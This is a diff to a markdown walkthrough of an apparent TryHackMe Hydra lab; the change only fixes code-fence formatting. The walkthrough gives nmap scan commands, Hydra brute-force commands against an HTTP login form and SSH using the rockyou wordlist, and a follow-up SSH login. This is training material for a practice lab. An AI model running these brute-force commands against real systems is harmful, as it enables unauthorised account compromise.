@@ -35,9 +35,9 @@ Start the AttackBox and lab machine. Wait for the target to finish booting, then
 
 Run a service scan and save the results:
 
-\`\`\`bash
+```bash
 nmap -sC -sV -oN hydra-nmap.txt MACHINE_IP
-\`\`\`
+```
 
 - **-sC** runs the default scripts.
 - **-sV** attempts to identify service versions.
@@ -55,9 +55,9 @@ The form uses a POST request to `/login`. The username and password fields are n
 
 ### 2. Run Hydra against the POST form
 
-\`\`\`bash
+```bash
 hydra -l molly -P /usr/share/wordlists/rockyou.txt MACHINE_IP http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
-\`\`\`
+```
 
 Parameter breakdown:
 - **-l molly** supplies the username.
@@ -92,9 +92,9 @@ The flag is redacted here as `THM{hidden}`.
 
 ### 4. Run Hydra against SSH
 
-\`\`\`bash
+```bash
 hydra -l molly -P /usr/share/wordlists/rockyou.txt -t 4 MACHINE_IP ssh
-\`\`\`
+```
 
 - **-l molly** selects the username.
 - **-P** selects the password list.
@@ -108,18 +108,18 @@ The room's SSH password for Molly is:
 
 Verify it by connecting to the target:
 
-\`\`\`bash
+```bash
 ssh molly@MACHINE_IP
-\`\`\`
+```
 
 After login, verify the identity and inspect the home directory:
 
-\`\`\`bash
+```bash
 whoami
 id
 pwd
 ls -la
-\`\`\`
+```
 
 ### Question: “Use Hydra to bruteforce molly's SSH password. What is flag 2?”
 
